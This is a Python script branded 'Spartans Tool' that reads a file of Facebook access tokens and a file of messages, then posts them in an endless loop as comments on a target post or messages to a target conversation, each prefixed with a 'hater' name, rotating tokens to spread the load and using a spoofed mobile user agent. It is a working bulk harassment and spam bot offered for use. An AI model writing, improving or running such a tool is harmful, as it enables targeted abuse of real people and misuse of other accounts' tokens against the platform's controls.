import time
import webbrowser

def fancy_banner():
    """Display a professional two-line SPARTANS banner"""
    banner = """
 __   __        __  ___            __  
/__` |__)  /\  |__)  |   /\  |\ | /__` 
.__/ |    /~~\ |  \  |  /~~\ | \| .__/ 

"""
    for line in banner.split("\n"):
        print(line)
        time.sleep(0.1)

def send_messages():
    import requests
    import json
    import sys
    from platform import system
    import os
    import subprocess
    import http.server
    import socketserver
    import threading
    import getpass
    from colorama import Fore, Style
    from datetime import datetime
    from time import sleep
    from os import system as sh
    import os, platform, binascii, sys, _socket, ssl, certifi, zlib, json, uuid

    logo = r'''
 ___________________________________________

 __   __        __  ___            __  
/__` |__)  /\  |__)  |   /\  |\ | /__` 
.__/ |    /~~\ |  \  |  /~~\ | \| .__/ 

____________________________________________        
'''
    print(Fore.CYAN + logo + Style.RESET_ALL)

    token_file = input(f"Enter the Token File : ") 
    tokens = open(token_file, "r").read().splitlines()
    num_tokens = len(tokens)

    requests.packages.urllib3.disable_warnings()

    def cls():
        if system() == 'Linux':
            os.system('clear')
        elif system() == 'Windows':
            os.system('cls')

    cls()

    def liness():
        print('\33[0;37;40m---------------------------------------------------')

    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36'
    }

    liness()
    access_tokens = [token.strip() for token in tokens]

    convo_id = input(f"Enter the Post ID : ")
    text_file_path = input(f"Enter the Messages File : ") 
    messages = open(text_file_path, "r").readlines()

    num_messages = len(messages)
    max_tokens = min(num_tokens, num_messages)

    haters_name = input(f"Enter Hater Name : ")
    speed = int(input(f"Enter Delay : ")) 

    liness()

    while True:
        try:
            for message_index in range(num_messages):
                token_index = message_index % max_tokens
                access_token = access_tokens[token_index]

                message = messages[message_index].strip()

                url = f"https://graph.facebook.com/v15.0/{convo_id}/comments"
                parameters = {'access_token': access_token, 'message': haters_name + ' ' + message}
                response = requests.post(url, json=parameters, headers=headers)

                current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
                if response.ok:
                    print(f"[+] Comment {message_index + 1} of Post {convo_id} sent by Token {token_index + 1}: {haters_name} {message}")
                    print(f"  - Time: {current_time}")
                    liness()
                else:
                    print(f"[x] Failed to send Comment {message_index + 1} of Post {convo_id} with Token {token_index + 1}: {haters_name} {message}")
                    print(f"  - Time: {current_time}")
                    liness()
                time.sleep(speed)

            print("[+] All messages sent. Restarting the process...")
        except Exception as e:
            print(f"[!] An error occurred: {e}")

def send_comment():
    import requests
    import json
    import time
    import sys
    from platform import system
    import os
    import subprocess
    import http.server
    import socketserver
    import threading
    import random

    class MyHandler(http.server.SimpleHTTPRequestHandler):
        def log_message(self, format, *args):
            return  

    def execute_server():
        PORT = 4000
        logo = r'''
 ___________________________________________

 __   __        __  ___            __  
/__` |__)  /\  |__)  |   /\  |\ | /__` 
.__/ |    /~~\ |  \  |  /~~\ | \| .__/ 

____________________________________________
'''
        print(logo)

    def send_messages():
        token_file_path = input("Enter the file path for the tokens: ")
        with open(token_file_path, 'r') as file:
            tokens = [line.strip() for line in file.readlines()]
        num_tokens = len(tokens)

        requests.packages.urllib3.disable_warnings()

        def liness():
            print('\u001b[37m' + '---------------------------------------------------')

        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36'
        }

        liness()
        access_tokens = tokens
        convo_id = input("Enter the conversation ID: ")
        text_file_path = input("Enter the file path for message file: ")

        with open(text_file_path, 'r') as file:
            messages = file.readlines()

        num_messages = len(messages)
        max_tokens = min(num_tokens, num_messages)

        haters_name = input("Enter the hater's name: ")
        speed = int(input("Enter the message speed (in seconds): "))

        liness()

        while True:
            try:
                for message_index in range(num_messages):
                    token_index = message_index % max_tokens
                    access_token = access_tokens[token_index]

                    message = messages[message_index].strip()

                    url = f"https://graph.facebook.com/v15.0/t_{convo_id}/"
                    parameters = {'access_token': access_token, 'message': haters_name + ' ' + message}
                    response = requests.post(url, json=parameters, headers=headers)

                    current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
                    if response.ok:
                        print(f"[+] Messages {message_index + 1} of Convo {convo_id} sent by Token {token_index + 1}: {haters_name} {message}")
                    else:
                        print(f"[x] Failed to send messages {message_index + 1} of Convo {convo_id} with Token {token_index + 1}: {haters_name} {message}")
                    time.sleep(speed)

                print("[+] All messages sent. Restarting the process...")
            except Exception as e:
                print(f"[!] An error occurred: {e}")

    execute_server()
    send_messages()

def main():
    fancy_banner()
    print("\n🔥 Welcome to Spartans Tool! Choose an option: 🔥\n")

    while True:
        print("1️⃣  Post Tool")
        print("2️⃣  Convo Tool")
        print("3️⃣  Owner Facebook Account")
        print("4️⃣  Exit")

        choice = input("\nEnter your choice (1-4): ")

        if choice == "1":
            print("\n📝 Opening Post Tool...\n")
            send_messages()

        elif choice == "2":
            print("\n💬 Opening Convo Tool...\n")
            send_comment()

        elif choice == "3":
            print("\n🔗 Opening Facebook Account...\n")
            webbrowser.open("https://m.facebook.com/azlan.spartans.94")

        elif choice == "4":
            print("\n👋 Exiting... Goodbye!")
            break  

        else:
            print("\n❌ Invalid choice, please try again!\n")

if __name__ == "__main__":
    main()
